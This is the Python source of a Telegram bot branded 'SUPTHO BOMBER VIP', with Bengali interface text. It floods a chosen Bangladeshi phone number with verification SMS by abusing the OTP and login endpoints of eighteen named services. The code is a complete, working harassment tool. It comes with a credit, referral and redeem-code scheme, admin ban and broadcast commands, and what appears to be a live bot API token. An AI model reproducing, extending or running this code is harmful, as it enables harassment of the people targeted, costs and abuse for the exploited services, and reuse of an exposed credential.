import telebot
import requests
import threading
import time
import json
import random
import string
import os
import html
from flask import Flask
from telebot import types

# ==========================================
# 🔧 CONFIGURATION
# ==========================================
API_TOKEN = '8577991344:AAGdkMNIt1v-bSBgsQKQSjGOtaklWAYn5NI'  # আপনার বটের টোকেন দিন
OWNER_ID = 6941003064              # আপনার ইউজার আইডি দিন (UserInfoBot থেকে পাবেন)
OWNER_USERNAME = "Suptho1"          # ইউজারনেম (@ ছাড়া)
CHANNEL_ID = "@SH_tricks"           # চ্যানেল ইউজারনেম
DATA_FILE = 'bot_data.json'

bot = telebot.TeleBot(API_TOKEN)
stop_flags = {}

# ==========================================
# 💾 DATABASE MANAGER
# ==========================================
def load_data():
    if not os.path.exists(DATA_FILE):
        return {"users": {}, "codes": [], "whitelist": [], "banned": []}
    try:
        with open(DATA_FILE, 'r') as f: return json.load(f)
    except: return {"users": {}, "codes": [], "whitelist": [], "banned": []}

def save_data(data):
    with open(DATA_FILE, 'w') as f: json.dump(data, f, indent=4)

db = load_data()

# ==========================================
# 🌐 WEB SERVER (Keep Alive)
# ==========================================
app = Flask('')
@app.route('/')
def home(): return "Bot Status: Online"

def run_web_server():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

def keep_alive():
    threading.Thread(target=run_web_server, daemon=True).start()

# ==========================================
# 🛡️ SYSTEM HELPERS
# ==========================================
def is_joined(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

def get_user(user_id):
    uid = str(user_id)
    if uid not in db['users']:
        db['users'][uid] = {"credits": 5, "joined": True}
        save_data(db)
    return db['users'][uid]

# ==========================================
# 🌐 API ENGINE (All 27+ APIs)
# ==========================================
def api_hit(url, method, data=None, json_data=None, headers=None):
    try:
        head = {"User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"}
        if headers: head.update(headers)
        if method == "POST": requests.post(url, data=data, json=json_data, headers=head, timeout=5)
        else: requests.get(url, headers=head, timeout=5)
    except: pass

def bombing_task(target, amount, call_id):
    global stop_flags
    stop_flags[call_id] = False
    sent = 0
    while sent < amount and not stop_flags.get(call_id, False):
        # 1. Apex
        api_hit("https://api.apex4u.com/api/auth/login", "POST", json_data={"phoneNumber": target})
        sent += 1; 
        if sent >= amount or stop_flags.get(call_id, False): break
        
        # 2. ShopBase
        api_hit("https://shopbasebd.com/store/registration/sendOTP", "POST", data={"number": target, "_token": "ktrqcmKSAn8cP3vZvw3xkbav2ww65eRvaikWKDFo"})
        sent += 1; 
        if sent >= amount: break

        # 3. Bikroy
        api_hit(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}", "GET")
        sent += 1; 
        if sent >= amount: break

        # 4. Banglalink
        api_hit("https://web-api.banglalink.net/api/v1/user/otp-login/request", "POST", json_data={"mobile": target})
        sent += 1; 
        if sent >= amount: break

        # 5. GP
        api_hit("https://webloginda.grameenphone.com/backend/api/v1/otp", "POST", data={"msisdn": target})
        sent += 1; 
        if sent >= amount: break

        # 6. Jatri
        api_hit("https://api.retail.jatri.co/auth/api/v1/send-otp", "POST", json_data={"phone": target, "purpose": "USER_LOGIN"})
        sent += 1; 
        if sent >= amount: break

        # 7. Toffee
        api_hit("https://prod-services.toffeelive.com/sms/v1/subscriber/otp", "POST", json_data={"target": "88"+target, "resend": False})
        sent += 1; 
        if sent >= amount: break

        # 8. Chorki
        api_hit("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", "POST", json_data={"number": "+88"+target})
        sent += 1; 
        if sent >= amount: break

        # 9. Hoichoi
        api_hit("https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code", "POST", json_data={"phoneNumber": "+88"+target, "platform": "MOBILE_WEB"})
        sent += 1; 
        if sent >= amount: break

        # 10. Shikho
        api_hit("https://api.shikho.com/auth/v2/send/sms", "POST", json_data={"phone": "88"+target, "type": "student"})
        sent += 1; 
        if sent >= amount: break

        # 11. Ostad
        api_hit("https://api.ostad.app/api/v2/user/with-otp", "POST", json_data={"msisdn": target})
        sent += 1; 
        if sent >= amount: break

        # 12. Osudpotro
        api_hit("https://api.osudpotro.com/api/v1/users/send_otp", "POST", json_data={"mobile": "+88-"+target})
        sent += 1; 
        if sent >= amount: break

        # 13. Swap
        api_hit("https://api.swap.com.bd/api/v1/send-otp", "POST", json_data={"phone": target})
        sent += 1; 
        if sent >= amount: break

        # 14. Rokomari
        api_hit(f"https://www.rokomari.com/otp/send?emailOrPhone=88{target}&countryCode=BD", "GET")
        sent += 1; 
        if sent >= amount: break

        # 15. eCourier
        api_hit(f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={target}", "GET")
        sent += 1; 
        if sent >= amount: break

        # 16. Viewlift
        api_hit("https://prod-api.viewlift.com/identity/signup?site=prothomalo", "POST", json_data={"phoneNumber":"+88"+target})
        sent += 1; 
        if sent >= amount: break

        # 17. Eonbazar
        api_hit("https://app.eonbazar.com/api/auth/register", "POST", json_data={"mobile": target})
        sent += 1; 
        if sent >= amount: break

        # 18. Sundarban
        api_hit("https://tracking.sundarbancourierltd.com/PreBooking/SendPin", "POST", json_data={"PreBookingRegistrationPhoneNumber": target})
        sent += 1; 
        if sent >= amount: break
        
        time.sleep(1) # সার্ভার সেফটি ডিলে

# ==========================================
# 🤖 BOT UI & COMMANDS
# ==========================================


@bot.message_handler(commands=['start'])
def welcome(message):
    uid = str(message.from_user.id)
    args = message.text.split()
    
    if uid not in db['users']:
        referrer = args[1] if len(args) > 1 and args[1] in db['users'] else None
        if referrer:
            db['users'][referrer]['credits'] += 5
            try: bot.send_message(referrer, "🎉 নতুন রেফারাল! আপনি ৫ ক্রেডিট পেয়েছেন।")
            except: pass
        db['users'][uid] = {"credits": 5, "joined": True}
        save_data(db)

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(types.KeyboardButton("🚀 Start Bomb"), types.KeyboardButton("💳 My Balance"))
    markup.add(types.KeyboardButton("👥 Refer & Earn"), types.KeyboardButton("💰 Redeem Credit"))
    markup.add(types.KeyboardButton("👑 Admin Support"))
    
    safe_name = html.escape(message.from_user.first_name)
    bot.send_message(message.chat.id, f"🔥 **SUPTHO BOMBER VIP** 🔥\n\n👋 স্বাগতম, {safe_name}!", reply_markup=markup, parse_mode='HTML')

@bot.message_handler(func=lambda m: True)
def handle_buttons(message):
    uid = str(message.from_user.id)
    if not is_joined(message.from_user.id):
        return bot.reply_to(message, f"❌ প্রথমে চ্যানেলে জয়েন করুন: {CHANNEL_ID}")

    if message.text == "🚀 Start Bomb":
        msg = bot.reply_to(message, "💣 টার্গেট নাম্বারটি দিন:")
        bot.register_next_step_handler(msg, ask_amount)
    elif message.text == "💳 My Balance":
        user = get_user(uid)
        cred_text = "Unlimited" if int(uid) == OWNER_ID else user['credits']
        bot.reply_to(message, f"💰 ব্যালেন্স: **{cred_text} Credits**", parse_mode='Markdown')
    elif message.text == "👥 Refer & Earn":
        link = f"https://t.me/{bot.get_me().username}?start={uid}"
        bot.reply_to(message, f"🎁 রেফার লিংক: `{link}`\n\nপ্রতি রেফারে ৫ ক্রেডিট!", parse_mode='Markdown')
    elif message.text == "💰 Redeem Credit":
        msg = bot.reply_to(message, "🎁 রিডিম কোডটি দিন:")
        bot.register_next_step_handler(msg, use_redeem)
    elif message.text == "👑 Admin Support":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("💬 Admin", url=f"https://t.me/{OWNER_USERNAME}"))
        bot.reply_to(message, "অ্যাডমিনের সাথে যোগাযোগ করুন:", reply_markup=markup)

def ask_amount(message):
    target = message.text.strip()
    if len(target) != 11 or not target.isdigit():
        return bot.reply_to(message, "⚠️ সঠিক ১১ ডিজিটের নাম্বার দিন।")
    msg = bot.reply_to(message, f"🎯 টার্গেট: `{target}`\n🔢 SMS পরিমাণ (Max 100):")
    bot.register_next_step_handler(msg, start_bombing, target)

def start_bombing(message, target):
    uid = str(message.from_user.id)
    try:
        amount = int(message.text)
        if amount > 100: return bot.reply_to(message, "⚠️ সর্বোচ্চ ১০০ SMS।")
        
        if int(uid) != OWNER_ID:
            if db['users'][uid]['credits'] < 1: return bot.reply_to(message, "⚠️ ক্রেডিট নেই।")
            db['users'][uid]['credits'] -= 1
            save_data(db)
        
        if target in db['whitelist']: return bot.reply_to(message, "🛡️ এই নাম্বার প্রোটেক্টেড।")
        if uid in db['banned']: return bot.reply_to(message, "🚫 আপনি ব্যানড।")

        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⛔ STOP", callback_data=f"stop_{uid}"))
        bot.reply_to(message, f"🚀 অ্যাটাক শুরু!\n🎯 টার্গেট: `{target}`", reply_markup=markup)
        threading.Thread(target=bombing_task, args=(target, amount, f"stop_{uid}")).start()
    except: bot.reply_to(message, "❌ ভুল পরিমাণ!")

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def stop_call(call):
    stop_flags[call.data] = True
    bot.edit_message_text("✅ অ্যাটাক বন্ধ।", call.message.chat.id, call.message.message_id)

def use_redeem(message):
    code = message.text.strip()
    if code in db['codes']:
        db['codes'].remove(code)
        db['users'][str(message.from_user.id)]['credits'] += 5
        save_data(db)
        bot.reply_to(message, "✅ ৫ ক্রেডিট যোগ হয়েছে।")
    else: bot.reply_to(message, "❌ ভুল কোড।")

# ==========================================
# 👑 ADMIN COMMANDS
# ==========================================
@bot.message_handler(commands=['admin', 'gencodes', 'broadcast', 'ban', 'unban', 'white', 'unwhite'])
def admin_cmd(message):
    if message.from_user.id != OWNER_ID: return
    cmd = message.text.split()
    
    try:
        if cmd[0] == '/admin':
            bot.reply_to(message, "👑 Admin Help:\n/gencodes <num>\n/ban <uid>\n/white <phone>\n/broadcast <msg>")
        elif cmd[0] == '/gencodes':
            num = int(cmd[1])
            new_codes = ["SUP-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6)) for _ in range(num)]
            db['codes'].extend(new_codes)
            save_data(db)
            bot.reply_to(message, f"✅ {num} টি কোড তৈরি:\n`{', '.join(new_codes)}`", parse_mode='Markdown')
        elif cmd[0] == '/ban':
            db['banned'].append(cmd[1])
            save_data(db); bot.reply_to(message, "🚫 Banned.")
        elif cmd[0] == '/white':
            db['whitelist'].append(cmd[1])
            save_data(db); bot.reply_to(message, "🛡️ Whitelisted.")
        elif cmd[0] == '/broadcast':
            msg_text = message.text.replace("/broadcast ", "")
            for user in db['users']:
                try: bot.send_message(user, f"📢 **NOTICE:**\n{msg_text}")
                except: pass
            bot.reply_to(message, "✅ সফল।")
    except: bot.reply_to(message, "❌ ভুল কমান্ড।")

# ==========================================
# 🔥 RUNNER
# ==========================================
if __name__ == "__main__":
    try: bot.remove_webhook()
    except: pass
    keep_alive()
    bot.polling(non_stop=True)
